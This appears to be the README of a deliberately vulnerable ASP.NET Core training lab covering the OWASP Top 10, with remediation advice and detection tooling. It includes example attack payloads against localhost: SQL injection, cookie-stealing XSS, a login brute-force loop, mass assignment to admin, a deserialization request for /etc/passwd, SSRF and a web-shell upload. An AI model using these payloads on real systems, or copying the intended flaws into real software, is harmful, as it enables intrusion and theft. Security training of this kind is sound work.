# OWASPDotNetLab

> **Intentionally insecure ASP.NET Core MVC application for local security training only.**

OWASPDotNetLab is a deliberately vulnerable .NET 8 MVC application that
implements the **OWASP Top 10 (2021)** categories end-to-end. It is designed
to be attacked, scanned, and remediated - similar in spirit to OWASP
WebGoat, DVWA, and Juice Shop, but for the ASP.NET Core stack.

## ⚠️ Disclaimer

**DO NOT DEPLOY THIS APPLICATION TO A PUBLIC NETWORK OR PRODUCTION ENVIRONMENT.**

The application is intentionally vulnerable. It contains:
- Plaintext password storage
- SQL injection sinks
- Stored and reflected XSS
- Server-side request forgery
- Unrestricted file upload
- Hardcoded secrets
- Missing authorization on mutating endpoints
- Mass assignment
- Insecure deserialization
- Disabled logging for security events

Run it only on a trusted local machine, inside a container, or on an
isolated virtual network.

---

## How to run

```bash
# from the repository root
cd OWASPDotNetLab
dotnet restore
dotnet run
```

Then open <http://localhost:5000> (or whatever port Kestrel prints).

**Seeded accounts**

| Username | Password   | Role  | Balance |
|----------|------------|-------|---------|
| alice    | alice123   | USER  | 500.00  |
| bob      | bob123     | USER  | 300.00  |
| admin    | admin123   | ADMIN | 99999.99|

---

## Vulnerabilities included

| OWASP | Vulnerability | CWE | Endpoint | File |
|-------|---------------|-----|----------|------|
| A01 | Broken Access Control / IDOR | CWE-639 | `GET /api/profile/{id}` | `Controllers/UserController.cs` |
| A01 | IDOR - no authorization | CWE-639 | `GET /api/user/{id}` | `Controllers/UserController.cs` |
| A02 | Cryptographic Failures - plaintext passwords | CWE-256 | `POST /Auth/Login` | `Services/UserService.cs` |
| A03 | SQL Injection | CWE-89 | `GET /api/search?q=` | `Services/ProductService.cs` |
| A03 | Reflected XSS | CWE-79 | `GET /api/greet?name=` | `Controllers/ProductController.cs` |
| A03 | Stored XSS | CWE-79 | `POST /Comments/Create` | `Controllers/CommentController.cs`, `Views/Comments/Index.cshtml` |
| A04 | Insecure Design (transfer trusts client) | CWE-285 | `POST /api/transfer` | `Controllers/AdminController.cs` |
| A05 | Security Misconfiguration (dev page, debug) | CWE-16 | `/` | `Program.cs` |
| A05 | Sensitive Information Exposure | CWE-200 | `GET /api/config` | `Controllers/AdminController.cs` |
| A07 | Authentication Failures | CWE-307 | `POST /Auth/Login` | `Controllers/AuthController.cs` |
| A08 | Mass Assignment | CWE-915 | `POST /Auth/Register` | `Controllers/AuthController.cs` |
| A08 | Insecure Deserialization | CWE-502 | `POST /api/deserialize` | `Controllers/VulnerabilityController.cs` |
| A09 | Logging Failures | CWE-778 | multiple | `Controllers/AuthController.cs`, `Controllers/AdminController.cs` |
| A10 | SSRF | CWE-918 | `GET /api/fetch?url=` | `Controllers/SSRFController.cs` |
| A04/A05 | Unrestricted File Upload | CWE-434 | `POST /upload` | `Controllers/UploadController.cs` |
| A05/A07 | Hardcoded Secrets | CWE-798 | `Program.cs`, `Controllers/VulnerabilityController.cs` | source |

A live catalogue with example payloads is available at **`/Vulnerabilities`**.

---

## Example attack payloads

### A01 - IDOR
```bash
# Replace {id} with any value 1..N
curl http://localhost:5000/api/profile/1
curl http://localhost:5000/api/user/2
```

### A02 - Plaintext password exposure
Browse to `/Users` - the password column is rendered in cleartext.

### A03 - SQL Injection
```bash
curl 'http://localhost:5000/api/search?q=%27%20OR%201%3D1%20--'
```

### A03 - Reflected XSS
```bash
curl 'http://localhost:5000/api/greet?name=%3Cscript%3Ealert(1)%3C/script%3E'
```

### A03 - Stored XSS
```bash
curl -X POST -d 'author=attacker&body=<script>alert(document.cookie)</script>' \
    http://localhost:5000/Comments/Create
```
Then visit <http://localhost:5000/Comments> in a browser.

### A04 - Trusting the client (transfer)
```bash
curl -X POST 'http://localhost:5000/api/transfer?fromUserId=1&toUserId=3&amount=999999'
```

### A05 - Sensitive data exposure
```bash
curl http://localhost:5000/api/config
```

### A05/A07 - Hardcoded secrets
```bash
curl http://localhost:5000/api/secrets
```

### A07 - Brute-force login
```bash
for i in {1..1000}; do
  curl -s -X POST -d "username=admin&password=admin$i" http://localhost:5000/Auth/Login
done
```
No lockout. No rate limit. No MFA.

### A08 - Mass assignment
```bash
curl -X POST -H 'Content-Type: application/json' \
     -d '{"username":"attacker","password":"123","role":"ADMIN","balance":999999}' \
     http://localhost:5000/Auth/Register
```

### A08 - Insecure deserialization
```bash
curl -X POST -H 'Content-Type: application/json' \
     -d '{"$type":"System.IO.FileInfo, mscorlib","FileName":"/etc/passwd"}' \
     http://localhost:5000/api/deserialize
```

### A09 - No logs
Trigger failed logins, transfers, privilege escalation - then check
the application logs. There is nothing to find.

### A10 - SSRF
```bash
curl 'http://localhost:5000/api/fetch?url=http://localhost:5000/api/config'
```

### A04/A05 - Unrestricted file upload
```bash
# 1. upload a malicious file
curl -X POST -F 'file=@shell.aspx' http://localhost:5000/upload
# 2. request the file
curl http://localhost:5000/uploads/shell.aspx
```

---

## Remediation guidance

| OWASP | Remediation |
|-------|-------------|
| A01 | Add `[Authorize]` and per-resource ownership checks. Use resource-based authorization handlers. |
| A02 | Hash passwords with ASP.NET Core `PasswordHasher<T>` (PBKDF2), `bcrypt`, or Argon2id. Never log credentials. |
| A03 (SQLi) | Use parameterized queries, EF Core LINQ, or `FromSqlInterpolated`. Never string-concatenate user input. |
| A03 (XSS) | Encode all output. Use `@Html.Encode` or Razor's `@` expression. Never call `@Html.Raw` on user input. Set strict `Content-Security-Policy`. |
| A04 | Derive `fromUserId` from the authenticated principal. Validate state transitions. Use optimistic concurrency. |
| A05 | Disable `UseDeveloperExceptionPage` outside Development. Don't expose `IConfiguration`. Run with `ASPNETCORE_ENVIRONMENT=Production`. |
| A07 | Implement account lockout, throttling, MFA, and structured audit logs (`ILogger` or a SIEM). |
| A08 | Use view-model DTOs. Reject unknown properties with `[ApiController]` + explicit binding. |
| A08 (deserialization) | Set `TypeNameHandling.None`. Use `System.Text.Json` with strict options. |
| A09 | Log all security events with `ILogger<T>` and ship them to a SIEM. |
| A10 | Allow-list hostnames/schemes. Resolve DNS and reject private/loopback addresses. Block IMDS at the network layer. |
| Upload | Allow-list extensions, store outside `wwwroot`, rename to a random GUID, enforce size limits, scan for malware, set `Content-Disposition: attachment`. |
| Hardcoded secrets | Use Azure Key Vault, AWS Secrets Manager, or `dotnet user-secrets` + environment variables in production. |

---

## Project structure

```
OWASPDotNetLab/
├── Controllers/
│   ├── AdminController.cs
│   ├── AuthController.cs
│   ├── CommentController.cs
│   ├── DashboardController.cs
│   ├── ProductController.cs
│   ├── SSRFController.cs
│   ├── UploadController.cs
│   ├── UserController.cs
│   └── VulnerabilityController.cs
├── Models/
│   ├── Comment.cs
│   ├── Product.cs
│   └── User.cs
├── Data/
│   ├── AppDbContext.cs
│   └── DbSeeder.cs
├── Services/
│   ├── ProductService.cs
│   └── UserService.cs
├── Views/
│   ├── Admin/Index.cshtml
│   ├── Comments/Index.cshtml
│   ├── Dashboard/Index.cshtml
│   ├── Login/Login.cshtml
│   ├── Login/Register.cshtml
│   ├── Products/Index.cshtml
│   ├── Shared/_Layout.cshtml
│   ├── SSRF/Index.cshtml
│   ├── Upload/Index.cshtml
│   ├── Users/Index.cshtml
│   ├── Vulnerabilities/Index.cshtml
│   ├── _ViewImports.cshtml
│   └── _ViewStart.cshtml
├── wwwroot/
│   ├── css/site.css
│   └── uploads/        # intentionally writeable
├── Program.cs
├── appsettings.json
├── appsettings.Development.json
├── OWASPDotNetLab.csproj
└── README.md
```

---

## Detection tooling

The vulnerabilities are intentionally easy for static analyzers to detect:

- **OWASP ZAP** - spider + active scan against `http://localhost:5000`
- **Semgrep** - `semgrep --config p/owasp-top-ten .`
- **SonarQube** - C# / Security ruleset
- **Checkmarx** - SAST scan of the solution
- **CodeQL** - default C# security queries
- **GitHub Dependabot / Code Scanning** - default config

Each vulnerable block carries a standardized comment:

```csharp
// VULNERABILITY:
// CWE:
// OWASP:
// Description:
// Example Attack:
```

so detection rules can match the comments directly.

---

## License

For training and educational use only.
